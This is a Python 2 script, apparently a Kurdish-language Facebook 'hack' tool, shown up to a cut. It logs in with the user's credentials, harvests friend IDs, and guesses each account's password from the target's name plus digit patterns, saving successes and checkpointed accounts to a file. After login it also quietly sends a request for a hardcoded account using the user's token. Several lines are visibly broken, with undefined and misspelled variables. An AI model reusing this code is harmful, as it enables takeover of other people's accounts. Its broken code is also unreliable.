import os
import colorama
import uuid
import time
import requests
def hack():
    import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
    reload(sys)
    sys.setdefaultencoding('utf8')
    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

    def keluar():
        print '\x1b[1;91[!] \x1b[1;91mExit'
        os.sys.exit()


    def acak(b):
        w = 'ahtdzjc'
        d = ''
        for i in x:
            d += '!' + w[random.randint(0, len(w) - 1)] + i

        return cetak(d)


    def cetak(b):
        w = 'ahtdzjc'
        for i in w:
            j = w.index(i)
            x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

        x += '\x1b[0m'
        x = x.replace('!0', '\x1b[0m')
        sys.stdout.write(x + '\n')

    def jalan(z):
        for e in z + '\n':
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.1)

    logo ="""
    
    
    
\033[1;91mPewist Ba logow Sht nakat
Zhyan Ba Sadayawa Jwana

\033[1;94mMyTelegram : \033[1;91mProfis0r

\033[1;94mMyChanell  : \033[1;91m@CrackerForKurd0


            
    """
    back = 0
    berhasil = []
    cekpoint = []
    oks = []
    id = []
    listgrup = []
    vulnot = '\x1b[31mNot Vuln'
    vuln = '\x1b[32mVuln'
    os.system('clear')
    print '\x1b[0;91mPROFISSoR\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92...100%  '
    CorrectUsername = 'mam'
    CorrectPassword = 'heewa'
    loop = 'true'
    while loop == 'true':
        username = raw_input('\x1b[1;91[\xf0\x9f\x94\x90] \x1b[0;31m Enter Username\x1b[1;92m \xe2\x9a\xa1 ')
        if username == CorrectUsername:
            password = raw_input('\x1b[1;91[\xf0\x9f\x94\x93] \x1b[0;31m Enter Password\x1b[1;92m \xe2\x9a\xa1 ')
            if password == CorrectPassword:
                print 'PASSWORD U USERNAME AKAT RASTA' + username
                loop = 'false'
            else:
                print 'Wrong Password'
                os.system('PASSWORD AKAT HALAYA')
        else:
            print 'Wrong Username'
            os.system('USERNAME AKAT HALAYA')

    def login():
        os.system('clear')
        try:
            toket = open('login.txt', 'r')
            menu()
        except (KeyError, IOError):
            os.system('clear')
            print logo
            print 42 * '\x1b[1;91='
            print '\x1b[1;91m[\xf0\x9f\x91\xbb]\x1b[1;94m\xf0\x9f\x94\xa5FACEBOOKEKI NWE DAXL BKA \xf0\x9f\x94\xa5\x1b[1;91[\xf0\x9f\x91\xbb]'
            id = raw_input('\x1b[1;91[\xf0\x9f\x94\x90] \x1b[0;34mEMAIL-ID \x1b[1;91m: \x1b[1;92m')
            pwd = raw_input('\x1b[1;91[\xf0\x9f\x94\x93] \x1b[0;34mPASSWORD \x1b[1;91m: \x1b[1;92m')
            
            try:
                br.open('https://m.facebook.com')
            except mechanize.URLError:
                print '\n\x1b[1;91[!] \x1b[1;91mXATAKAT NAMAUA XATAKAT DAXEL BKAUA'
                keluar()

            br._factory.is_html = True
            br.select_form(nr=0)
            br.form['email'] = id
            br.form['pass'] = pwd
            br.submit()
            url = br.geturl()
            if 'save-device' in url:
                try:
                    sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                    data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                    x = hashlib.new('md5')
                    x.update(sig)
                    a = x.hexdigest()
                    data.update({'sig': a})
                    url = 'https://api.facebook.com/restserver.php'
                    r = requests.get(url, params=data)
                    z = json.loads(r.text)
                    unikers = open('login.txt', 'w')
                    unikers.write(z['access_token'])
                    unikers.close()
                    print '\n\x1b[1;36;40m[\xe2\x9c\x93] Login Done \xf0\x9f\x94\x93\xe2\x9a\xa1'
                    os.system('DAXRAUA DAXRAUA DAXRAUA')
                    requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                    menu()
                except requests.exceptions.ConnectionError:
                    print '\n\x1b[1;91m[!] XAT XAWA BiGORA'
                    keluar()

            if 'checkpoint' in url:
                print '\n\x1b[1;92m[!] ACCOUNT LA CHECKPOINTAYA'
                os.system('rm -rf login.txt')
                time.sleep(1)
                keluar()
            else:
                print '\n\x1b[1;93mFACEBOOKE KE NWE DAXEL BKAUA '
                os.system('rm -rf login.txt')
                time.sleep(1)
                login()


    def menu():
        os.system('clear')
        try:
            toket = open('login.txt', 'r').read()
        except IOError:
            os.system('clear')
            print '\x1b[1;91m[!] Token invalid'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()

        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
            ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
            b = json.loads(ots.text)
            sub = str(b['summary']['total_count'])
        except KeyError:
            os.system('clear')
            print '\x1b[1;91m'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;92mThere is no internet connection'
            keluar()

        os.system('clear')
        print logo
        print '   \x1b[1;33;92m\xe2\x98\x98\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x98\x98'
        print '   \x1b[1;36;40m\x1b[1;32;40m[*] NAWE FACEBOOKE DAXEL KRAU\x1b[1;32;92m: ' + nama + '  \t   \x1b[1;36;40m'
        print '   \x1b[1;36;40m\x1b[1;34;40m[*] JORE ID FACEBOOKA KA     \x1b[1;34;40m: ' + id + '        \x1b[1;36;92m'
        print '   \x1b[1;36;40m\x1b[1;34;40m[*] SABUSCRYBE FACEBOOKA KA  \x1b[1;34;92m: ' + sub + '                      \x1b[1;36;92m'
        print '   \x1b[1;33;92m\xe2\x98\x98\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x96\xa3\xe2\x96\xa0\xe2\x96\xa0\xe2\x96\xa3\xe2\x98\x98'
        print "\x1b[1;32;98m[1] \x1b[1;33;98m\xf0\x9f\x94\x8d H4CK KARDAN"
        print '\x1b[1;32;98m[0] \x1b[1;33;98m\xe2\x9d\x8c DAXSTANE ACCOUNTA KAT'
        pilih()


    def pilih():
        unikers = raw_input('\n\x1b[1;31;40m>>> \x1b[1;3540m')
        if unikers == '':
            print '\x1b[1;91mFill in correctly'
            pilih()
        elif unikers == '1':
            super()
        elif unikers == '2':
            os.system('clear')
            print logo
            print ' \x1b[1;33;98m\xe2\x9c\xa8\xe2\x9a\x9d\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xf0\x9f\xa6\x81\xf0\x9f\xa6\x81\xf0\x9f\xa6\x81\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x96\x91\xe2\x9a\x9d\xe2\x9c\xa8\n'
            os.system('git pull origin master')
            raw_input('\n\x1b[1;91m[ \x1b[1;97mGARANAWA \x1b[1;91m]')
            menu()
        elif unikers == '0':
            jalan('Token Removed')
            os.system('rm -rf login.txt')
            keluar()
        else:
            print '\x1b[1;91mFill in correctly'
            pilih()


    def super():
        global toket
        os.system('clear')
        try:
            toket = open('login.txt', 'r').read()
        except IOError:
            print '\x1b[1;91mToken invalid'
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()

        os.system('clear')
        print logo
        print '\x1b[1;32;92m[1] \x1b[1;33;98m\xf0\x9f\x91\x89 \xf0\x9f\x90\xafH4CK KARDANE HAWREKANAT'
        print '\x1b[1;32;92m[2] \x1b[1;33;98m\xf0\x9f\x91\x89 \xf0\x9f\x90\xafH4CK KARDAN BA ID'
        print '\x1b[1;32;92m[3] \x1b[1;33;98m\xf0\x9f\x91\x89 \xf0\x9f\x90\xafDRAUST KARDANE BA WORLIST'
        print '\x1b[1;32;36m[0] \x1b[1;33;91\xe2\x80\xbc\xef\xb8\x8fGARANAWA'
        pilih_super()


    def pilih_super():
        global cekpoint
        global oks
        peak = raw_input('\n\x1b[1;31;40m>>> \x1b[1;97m')
        if peak == '':
            print '\x1b[1;91mFill in correctly'
            pilih_super()
        else:
            if peak == '1':
                os.system('clear')
                print logo
                jalan('\x1b[1;92m[\xf0\x9f\x94\x8d] Getting IDs \xe2\x9c\x94\xef\xb8\x8f \x1b[1;98m.')
                r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
                z = json.loads(r.text)
                for s in z['data']:
                    id.append(s['id'])

            elif peak == '2':
                os.system('clear')
                print logo
                idt = raw_input('\x1b[1;91[*] ID YAK DABNE : ')
                try:
                    jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                    op = json.loads(jok.text)
                    print '\x1b[1;31;37m[\xf0\x9f\x8c\x80] NAWE KASAKA : ' + op['name']
                except KeyError:
                    print '\x1b[1;37m[\xf0\x9f\x8c\x80] ID YAKA BWNE NyA'
                    raw_input('\n\x1b[1;91[\x1b[1;94mBackGARANAWA\x1b[1;91]')
                    super()

                print '\x1b[1;35;37m[\xf0\x9f\x8c\x80] ID DAXEL BU '
                r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
                z = json.loads(r.text)
                for i in z['data']:
                    id.append(i['id'])

            elif peak == '3':
                os.system('clear')
                print logo
                brute()
            elif peak == '4':
                os.system('clear')
                print logo
                try:
                    idlist = raw_input('\x1b[1;91[+] \x1b[1;93mEnter the file name \x1b[1;91m: \x1b[1;97m')
                    for line in open(idlist, 'r').readlines():
                        id.append(line.strip())

                except IOError:
                    print '\x1b[1;35;40m[!] \x1b[1;35;40mFile not found'
                    raw_input('\n\x1b[1;35;40m[ \x1b[1;35;40mGARANAWA \x1b[1;35;40m]')
                    super()

            elif peak == '0':
                menu()
            else:
                print '\x1b[1;91mFill in correctly'
                pilih_super()
            print '\x1b[1;36;91[\xe2\x9a\x92\xef\xb8\x8f] DOZENAWAE ID  : \x1b[1;92m' + str(len(id))
            jalan('\x1b[1;34;91[\xe2\x9a\x92\xef\xb8\x8f] CHWARE BKA ! \xe2\x96\xb6\xef\xb8\x8f')
            titik = ['.   ', '..  ', '... ']
            for o in titik:
                print '\r\x1b[1;32;40m[\xf0\x9f\x90\xaf] CHWARE BKA LA KAR KARDN DAYA\x1b[1;93m' + o,
                sys.stdout.flush()
                time.sleep(1)

        print '\n\x1b[1;94m\xf0\x9f\x94\xb2\x1b[1;91mBO WASTAN DANE HACK KARD AUA DAGRA CTRL+Z \x1b[1;94m\xf0\x9f\x94\xb2'
        print '   \x1b[1;31;92m\xe2\x98\x85\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x98\x85'
        print '  \x1b[1;36;92m \xe2\x98\x85\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x98\x85'

        def main(arg):
            user = arg
            try:
                os.mkdir('out')
            except OSError:
                pass

            try:
                a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
                b = json.loads(a.text)
                pass1 = '1234554321'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                    print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass1 + '\n'
                    oks.append(user + pass1)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m  : \x1b[0;1m' + user
                    print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass1 + '\n'
                    cek = open('out/hamw_cp.txt', 'a')
                    cek.write('ID:' + user + ' Pw:' + pass1 + '\n')
                    cek.close()
                    cekpoint.append(user + pass1)
                else:
                    pass2 = b['first_name'] + '123'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                        print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass2 + '\n'
                        oks.append(user + pass2)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                        print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass2 + '\n'
                        cek = open('out/hamw_cp.txt', 'a')
                        cek.write('ID:' + user + ' Pw:' + pass2 + '\n')
                        ek.close()
                        cekpoint.append(user + pass2)
                    else:
                        pass3 = b['first_name'] + '1234'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        q = json.load(data)
                        if 'access_toen' in q:
                            print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                            print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass3 + '\n'
                            oks.append(user + pass3)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                            print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass3 + '\n'
                            cek = open('out/hamw_cp.txt', 'a')
                            cek.write('ID:' + user + ' Pw:' + pass3 + '\n')
                            cek.close()
                            cekpoint.append(user + pass3)
                        else:
                            pass4 = '11223344'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                print '\x1b[32;1m[\xe2\x9e\xb9] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass4 + '\n'
                                oks.append(user + pass4)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass4 + '\n'
                                cek = open('out/hamw_cp.txt', 'a')
                                cek.write('ID:' + user + ' Pw:' + pass4 + '\n')
                                cek.close()
                                cekpoint.append(user + pass4)
                            else:
                                pass5 = '1122334455'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                    print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass5 + '\n'
                                    oks.append(user + pass5)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                    print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass5 + '\n'
                                    cek = open('out/hamw_cp.txt', 'a')
                                    cek.write('ID:' + user + ' Pw:' + pass5 + '\n')
                                    cek.close()
                                    cekpoint.append(user + pass5)
                                else:
                                    pass6 = b['first_name'] + '12345'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                        print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass6 + '\n'
                                        oks.append(user + pass6)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                        print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass6 + '\n'
                                        cek = open('out/hamw_cp.txt', 'a')
                                        cek.write('ID:' + user + ' Pw:' + pass6 + '\n')
                                        cek.close()
                                        cekpoint.append(user + pass6)
                                    else:
                                        pass7 = b['first_name'] + '123456'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                            print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass7 + '\n'
                                            oks.append(user + pass7)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                            print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass7 + '\n'
                                            cek = open('out/hamw_cp.txt', 'a')
                                            cek.write('ID:' + user + ' Pw:' + pass7 + '\n')
                                            cek.close()
                                            cekpoint.append(user + pass7)
                                        else:
                                            pass8 = b['first_name'] + '1234567'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                                print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass8 + '\n'
                                                oks.append(user + pass8)
                                            elif 'www.facebook.com' in q['error_msg']:
                                                print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                                print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass8 + '\n'
                                                cek = open('out/hamw_cp.txt', 'a')
                                                cek.write('ID:' + uer + ' Pw:' + pass8 + '\n')
                                                cek.close()
                                                cekpoint.append(user + pass8)
                                            else:
                                                pass9 = b['first_name'] + '12345678'
                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_U&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                q = json.load(data)
                                                if 'access_token' in q:
                                                    print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                                    print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass9 + '\n'
                                                    oks.append(user + pass9)
                                                elif 'www.facebook.com' in q['error_msg']:
                                                    print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                                    print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass9 + '\n'
                                                    cek = open('out/hamw_cp.txt', 'a')
                                                    cek.write('ID:' + user + ' Pw:' + pass9 + '\n')
                                                    cek.close()
                                                    cekpoint.append(user + pass9)
                                                else:
                                                    pass10 = b['first_name'] + '123456789'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                                        print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass10 + '\n'
                                                        oks.append(user + pass10)
                                                    elif 'www.facebook.com' in q['error_msg']:
                                                        print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                                        print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass10 + '\n'
                                                        cek = open('out/hamw_cp.txt', 'a')
                                                        cek.write('ID:' + user + ' Pw:' + pass10 + '\n')
                                                        cek.close()
                                                        cekpoint.append(user + pass10)
                                                    else:
                                                        pass11 = b['last_name'] + '1234'
                                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                        q = json.load(data)
                                                        if 'access_token' in q:
                                                            print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                                            print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass11 + '\n'
                                                            oks.append(user + pass11)
                                                        elif 'www.facebook.com' in q['error_msg']:
                                                            print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                                            print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass11 + '\n'
                                                            cek = open('out/hamw_cp.txt', 'a')
                                                            cek.write('ID:' + user + ' Pw:' + pass11 + '\n')
                                                            cek.close()
                                                            cekpoint.append(user + pass11)
                                                        else:
                                                            pass12 = b['last_name'] + '12345'
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                                                print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass12 + '\n'
                                                                oks.append(user + pass12)
                                                            elif 'www.facebook.com' in q['error_msg']:
                                                                print '\x1b[33;1m[Cp\xf0\x9f\x90\xaf+] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                                                print '\x1b[33;1m[\xe2\x88\x9a] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass12 + '\n'
                                                                cek = open('out/hamw_cp.txt', 'a')
                                                                cek.write('ID:' + user + ' Pw:' + pass12 + '\n')
                                                                cek.close()
                                                                cekpoint.append(user + pass12)
                                                            else:
                                                                pass13 = b['first_name'] + '1122'
                                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                                q = json.load(data)
                                                                if 'access_token' in q:
                                                                    print '\x1b[32;1m[OK\xe2\x9c\x93] \x1b[0;1mID \x1b[1;91m      : \x1b[0;1m' + user
                                                                    print '\x1b[32;1m[!] \x1b[0;1mPassword \x1b[1;91m: \x1b[0;1m' + pass13 + '\n'
                                                                    oks.append(user + pass13)
                                                                elif 'www.facebook.com' in q['error_msg']:
